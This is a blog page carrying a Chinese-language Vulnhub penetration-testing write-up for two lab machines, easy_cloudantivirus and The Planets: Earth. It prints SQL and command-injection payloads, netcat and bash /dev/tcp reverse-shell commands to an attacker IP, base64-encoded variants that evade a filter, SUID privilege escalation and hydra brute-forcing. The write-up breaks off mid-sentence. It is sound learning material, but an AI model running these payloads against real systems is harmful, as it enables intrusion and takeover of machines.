<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="https://username.github.io">
  <title>Hexo</title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    
    <!-- <meta name="keywords" content="">
    <meta name="description" content=""> -->
  
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://username.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Isabella">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link rel="apple-touch-icon" href="/apple-touch-icon-180x180.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.a5fda8.css">
  <style type="text/css">
    
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

  
    
 	  <script src="/lib/clickLove.js"></script>
  
  


  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      


<div class="overlay" style="background: #FFF0F5;"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/img/head.jpg" class="js-avatar">
		</a>
		<hgroup>
			<h1 class="header-author"><a href="/">Isabella</a></h1>
		</hgroup>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/" target="_blank">主页</a></li>
			
				<li><a href="/" target="_blank">技术笔记</a></li>
			
				<li><a href="/tags/%E9%9A%8F%E7%AC%94/" target="_blank">随笔</a></li>
			
			</ul>
		</nav>
		<nav class="header-smart-menu">
			
				
					<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
				
			
				
					<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
				
			
				
					<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
				
			
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					
						<a class="github" href="#" 
												title="GitHub" target="_blank"><i class="icon-github"></i></a>
					
				
					
						<a class="github" href="#" 
												title="GitHub" target="_blank"><i class="icon-github"></i></a>
					
				
					
						<a class="gitee" href="#" 
												title="gitee" target="_blank"><i class="icon-gitee"></i></a>
					
				
					
						<a class="jianshu" href="#" 
												title="jianshu" target="_blank"><i class="icon-jianshu"></i></a>
					
				
			</div>
		
			
			
			
			
			<div>
				<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="240" height="86" src="//music.163.com/outchain/player?type=2&id=434902428&auto=1&height=66"></iframe>
			</div>
			
				
				<p style="font-size: 12px;">这似乎是首纯音乐，请尽情的欣赏它吧！<p>
			
		
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
      
      <a class="forkMe" style="position:absolute;z-index:999;top:0;right:0.5em;" 
        href="https://github.com/Isabella2inori.github.io" target="_blank">
        <img src="/img/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
      
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #FFF0F5"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<a href="/">
					<img src="/img/head.jpg" class="js-avatar">
				</a>
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">Isabella</h1>
			</hgroup>
			
			
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						
						<a class="github" target="_blank" 
							href="#" title="GitHub"><i class="icon-github"></i></a>
						
					
						
						<a class="github" target="_blank" 
							href="#" title="GitHub"><i class="icon-github"></i></a>
						
					
						
						<a class="gitee" target="_blank" 
							href="#" title="gitee"><i class="icon-gitee"></i></a>
						
					
						
						<a class="jianshu" target="_blank" 
							href="#" title="jianshu"><i class="icon-jianshu"></i></a>
						
					
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
		        
					<li style="width: 33.333333333333336%"><a href="/">技术笔记</a></li>
		        
					<li style="width: 33.333333333333336%"><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1"
              class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            

  
    <article id="post-Vulnhub记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2023/11/22/Vulnhub%E8%AE%B0%E5%BD%95/" target="_blank">Vulnhub记录</a>
  
    </h1>
  


  
  
<a href="/2023/11/22/Vulnhub%E8%AE%B0%E5%BD%95/" class="archive-article-date">
        <time datetime="2023-11-21T18:03:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-22</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <h1 id="Vulnhub记录"><a href="#Vulnhub记录" class="headerlink" title="Vulnhub记录"></a>Vulnhub记录</h1><blockquote>
<p>前言，搁置了很长很长一段时间的渗透实操，也得重新掌握起来，学习某位同学，一周三个靶机，并完整记录下来，之前DC系列已经打完</p>
</blockquote>
<h2 id="easy-cloudantivirus"><a href="#easy-cloudantivirus" class="headerlink" title="easy_cloudantivirus"></a>easy_cloudantivirus</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>一开始发现目标ip，可以用<code>netdiscover</code>，<code>arp-scan -l -I eth</code>等等</p>
<p>接下来是目标ip的详细信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -sC 192.168.1.8 &gt; info.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114160820130.png" alt="image-20230114160820130"></p>
<p>可以看到，目标开启了22的ssh端口和8080（80端口做了迁移），先访问8080看看，有一个输入邀请码的界面，尝试了一下简单的sql注入，发现并无回显</p>
<p>扫描配置的后台文件，dirsearc又发现了一个&#x2F;console的界面（需要输入pin码）</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114161802609.png" alt="image-20230114161802609"></p>
<p>回到网页首页，我们对输入参数做一个所有可输入符号的Fuzz，枚举所有符号输入，果然有收获</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114162716191.png" alt="image-20230114162716191"></p>
<p>可以看到，对于<code>&quot;</code>的输入，其&#x3D;&#x3D;返回异常&#x3D;&#x3D;，返回sqlite错误，可能存在sql注入</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114162816457.png" alt="image-20230114162816457"></p>
<p>重点关注报错语句</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114163620198.png" alt="image-20230114163620198"></p>
<p>可以看到，当输入<code>&quot;</code>时候，将前面一个闭合，可以根据该语句构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or 1 -- </span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114164215235.png" alt="image-20230114164215235"></p>
<p>这个页面尝试输入文件测试，会卡住很长时间（直接给我干崩，重启大法好）所以第二次从小文件量的hello测试，发现返回<code>/output</code>输出结果，形式很像linux命令行的结果，推测其可能直接作为命令进行执行</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114165828991.png" alt="image-20230114165828991"></p>
<p>使用<code>hello | ls</code>进行测试，发现果然是这样</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114165955775.png" alt="image-20230114165955775"></p>
<p>既然命令执行，那可以直接弹shell啊，直接<code>hello | nc 192.168.1.10 520 -e /bin/bash</code></p>
<p>但是实际发现并无结果，，，查看资料发现，可能是靶机的nc版本太老了，不支持-e参数，这里学到了一个骚操作，<strong>nc串联弹shell</strong></p>
<p>直接发送命令<code>hello | nc 192.168.1.10 521 | /bin/bash | nc 192.168.1.10 520</code></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114171603184.png" alt="image-20230114171603184"></p>
<p>可以看到此时有结果了，之前发现服务器上安装有py，所以改成交互式shell，&#x3D;&#x3D;（麻了，520端口似乎被占用无法用于回弹，换一个，521和1111，我说咋一直没回显）&#x3D;&#x3D;</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114172530394.png" alt="image-20230114172530394"></p>
<p>现在回弹shell成功，接下来就是查询用户以及密码，直接<code>cat /etc/passwd</code></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114175214263.png" alt="image-20230114175214263"></p>
<p>可以注意到有两个用户，cloudav和scanner（使用whoami可以发现我们用户是scanner），那只剩下ssh爆破？</p>
<p>再回过头来查询database.sql的内容（kali安装了sqlite3，绝了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br><span class="line">.open database.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>

<p>即可查询所有内容，所以之前的密码是password？</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114175823253.png" alt="image-20230114175823253"></p>
<p>用这几个密码，连接ssh试试，看看能不能出用户，rshell太受限制了，试了爆破，不行。。。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pwd.txt 192.168.1.8 ssh</span><br></pre></td></tr></table></figure>

<p>人麻了，试试本地提权吧，find查找具有SUID权限的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/home/scanner/update_cloudav</span><br><span class="line">/snap/core/5662/bin/mount</span><br><span class="line">/snap/core/5662/bin/ping</span><br><span class="line">/snap/core/5662/bin/ping6</span><br><span class="line">/snap/core/5662/bin/su</span><br><span class="line">/snap/core/5662/bin/umount</span><br><span class="line">/snap/core/5662/usr/bin/chfn</span><br><span class="line">/snap/core/5662/usr/bin/chsh</span><br><span class="line">/snap/core/5662/usr/bin/gpasswd</span><br><span class="line">/snap/core/5662/usr/bin/newgrp</span><br><span class="line">/snap/core/5662/usr/bin/passwd</span><br><span class="line">/snap/core/5662/usr/bin/sudo</span><br><span class="line">/snap/core/5662/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/5662/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/5662/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/5662/usr/sbin/pppd</span><br><span class="line">/snap/core/4917/bin/mount</span><br><span class="line">/snap/core/4917/bin/ping</span><br><span class="line">/snap/core/4917/bin/ping6</span><br><span class="line">/snap/core/4917/bin/su</span><br><span class="line">/snap/core/4917/bin/umount</span><br><span class="line">/snap/core/4917/usr/bin/chfn</span><br><span class="line">/snap/core/4917/usr/bin/chsh</span><br><span class="line">/snap/core/4917/usr/bin/gpasswd</span><br><span class="line">/snap/core/4917/usr/bin/newgrp</span><br><span class="line">/snap/core/4917/usr/bin/passwd</span><br><span class="line">/snap/core/4917/usr/bin/sudo</span><br><span class="line">/snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/4917/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/4917/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/4917/usr/sbin/pppd</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br></pre></td></tr></table></figure>

<p>我们一眼发现一个不一样的东西&#x3D;&#x3D;<code>/home/scanner/update_cloudav</code>&#x3D;&#x3D;，这是一个二进制文件，直接被赋予了SUID的权限，之前也打过像这种直接弹shell的话就可以得到root用户权限的shell，但是二进制文件无法修改了，所幸给了源码，我们进行查看</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114181240299.png" alt="image-20230114181240299"></p>
<p>直接，将我们的输入作为root用户的命令执行？那这不直接弹个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;1 | nc 192.168.1.10 4444 | /bin/bash | nc 192.168.1.10 5555&quot;</span><br></pre></td></tr></table></figure>



<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230114181833375.png" alt="image-20230114181833375"></p>
<p>OK，结束，root权限</p>
<h2 id="The-planets-Earth"><a href="#The-planets-Earth" class="headerlink" title="The planets: Earth"></a>The planets: Earth</h2><p>信息收集老套路了，netdiscover加nmap</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115163558215.png" alt="image-20230115163558215"></p>
<p>nmap扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 16:40 HKT</span><br><span class="line">Nmap scan report for earth (192.168.1.6)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 987 filtered tcp ports (no-response), 10 filtered tcp ports (admin-prohibited)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)</span><br><span class="line">|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br><span class="line">| Not valid before: 2021-10-12T23:26:31</span><br><span class="line">|_Not valid after:  2031-10-10T23:26:31</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">MAC Address: 08:00:27:C4:35:2F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6, Linux 5.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.26 ms earth (192.168.1.6)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>

<p>从上面可以看出，端口开了dns解析，我们修改<code>/etc/hosts</code>文件，添加<code>192.168.1.6 earth.local</code>和<code>192.168.1.6 terratest.earth.local</code>的解析，再进行访问即可，80端口页面有提交窗口，还有奇怪的previous messages</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115170417345.png" alt="image-20230115170417345"></p>
<p>测试发现，提交一次就会添加一个解析数字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&amp;1--&gt;00</span><br><span class="line">2&amp;1--&gt;03</span><br><span class="line">11&amp;11--&gt;0000</span><br><span class="line">10&amp;11--&gt;0001</span><br><span class="line">123456789&amp;123--&gt;00000005060a0a</span><br></pre></td></tr></table></figure>

<p>dirsearch扫描后台发现admin登录页面</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115171342866.png" alt="image-20230115171342866"></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115171411537.png" alt="image-20230115171411537"></p>
<p>接下来是443端口，访问<code>https://terratest.earth.local/</code>，莫得信息，后台页面扫描</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115172324982.png" alt="image-20230115172324982"></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115172534150.png" alt="image-20230115172534150"></p>
<p>访问<code>robots.txt</code>，一串配置信息</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115172653467.png" alt="image-20230115172653467"></p>
<p>最后一行明显是有信息的，但是不知道具体格式，fuzz一下测出来发现是&#x2F;testingnotes.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br><span class="line">测试安全信息传递系统的注意事项。</span><br><span class="line">*使用XOR加密作为算法，应该是安全的，因为在RSA中使用。</span><br><span class="line">*Earth已经确认他们收到了我们发送的信息。</span><br><span class="line">*testdata.txt是用来测试加密的。</span><br><span class="line">*terra被用作管理门户的用户名。</span><br><span class="line">Todo:</span><br><span class="line">*我们如何安全地将我们的月度密钥发送给地球？或者我们应该每周更换密钥？</span><br><span class="line">*需要测试不同的密钥长度以防止暴力攻击。密钥应该有多长？</span><br><span class="line">*需要改进信息传递界面和管理面板的界面，它目前非常基本。</span><br></pre></td></tr></table></figure>

<p>testdata.txt中的信息是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br><span class="line">根据放射性测定法的估计和其他证据，地球形成于45亿年前。在地球历史的头十亿年内，生命出现在海洋中，并开始影响地球的大气和表面，导致厌氧生物和后来的好氧生物的扩散。一些地质证据表明，生命可能早在41亿年前就已经出现了。</span><br></pre></td></tr></table></figure>

<p>我们来分析一下，去了解了一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/roc1010/article/details/103227081">XOR加密</a></p>
<p>XOR加密有一个重要的性质<br>$$<br>aXORbXORa&#x3D;a<br>$$<br>因为该运算建立在阿贝尔群上，所以满足交换，我们根据信息已知，testdata.txt经过了一次XOR 加密，有三个previous messages，所以我们只需要将正确的previous messages再次与testdata.txt异或运算即可得到对应的key</p>
<p>下面是经过大量尝试得到的其对应加密加密思路，都是使用UTF-8直接进行的XOR运算，结果呈16进制，所以首先将previous messages从16进制转为对应的ascii编码，再与testdata.txt原文进行XOR</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115182327063.png" alt="image-20230115182327063"></p>
<p>可以得到一个周期性的重复字符串<code>earthclimatechangebad4humans</code>，即为key，对应的解密前两条信息，均为乱码。</p>
<p>直接登录之前的<code>/admin/login</code>页面，<code>terra&amp;earthclimatechangebad4humans</code></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115184238709.png" alt="image-20230115184238709"></p>
<p>又是一个命令执行的界面，测试了一下ls有显示，直接nc弹shell</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115184508069.png" alt="image-20230115184508069"></p>
<p>发现会显示，远程连接被禁止，推测会有过滤，检测了nc等相关字符，使用base64加密进行过滤</p>
<p><code>echo bmMgMTkyLjE2OC4xLjEwIDU1NTUgLWUgL2Jpbi9iYXNoCg== | base64 -d | bash</code></p>
<p>但是kali上又是没有回弹信息，，，推测又是-e参数没有？</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115185738187.png" alt="image-20230115185738187"></p>
<p>嘶，nc串联弹shell只能连接一下，不能持久，，，这里换一种弹shell的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/192.168.1.10/5555 &gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>对上述base64加密<code>echo &quot;bash -i &amp;&gt;/dev/tcp/192.168.1.10/5555 &gt;&amp;1&quot; | base64</code></p>
<p>然后靶机上输入即可弹shell</p>
<p>还有一种骚气姿势&#x3D;&#x3D;<code>bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x0b.0x81/1234 0&gt;&amp;1</code>&#x3D;&#x3D;十六进制绕过，那么理论上也能10进制绕过弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguMS4xMC81NTU1IDwmMQo= | base64 -d | bash</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115190344491.png" alt="image-20230115190344491"></p>
<p>解释一下命令，并补充一些<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46676743/article/details/109673457">弹shell姿势</a></p>
<blockquote>
<p>#bash -i 打开一个交互式的bash<br>#&gt;&amp; 将标准错误输出重定向到标准输出<br>#&#x2F;dev&#x2F;tcp&#x2F;your ip&#x2F;port 意为调用socket,建立socket连接,其中your ip为要反弹到的主机ip，port为端口<br>#0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互</p>
</blockquote>
<p>接下来查看用户，<code>cat /etc/passed</code>，可以看到earth用户式root权限</p>
<p>那就查看suid权限想办法提权，<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/reset_root</span><br><span class="line">/usr/sbin/grub2-set-bootflag</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>

<p>这里想用CVE-2021-4034进行提权&#x3D;&#x3D;(靶机上unzip，gcc，和polkit都有)&#x3D;&#x3D;，但是不知道为什么nc传文件总是失败</p>
<p>用find指令很容易找出第一个flag，<code>find -name &quot;*flag.txt&quot;</code></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115200930280.png" alt="image-20230115200930280"></p>
<p>在kali对应文件夹中，用py开一个http服务，在对应文件夹中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>然后靶机上用wget直接下载到上面存第一个flag的地方</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.10/CVE-2021-4034-main.zip</span><br></pre></td></tr></table></figure>

<p>直接</p>
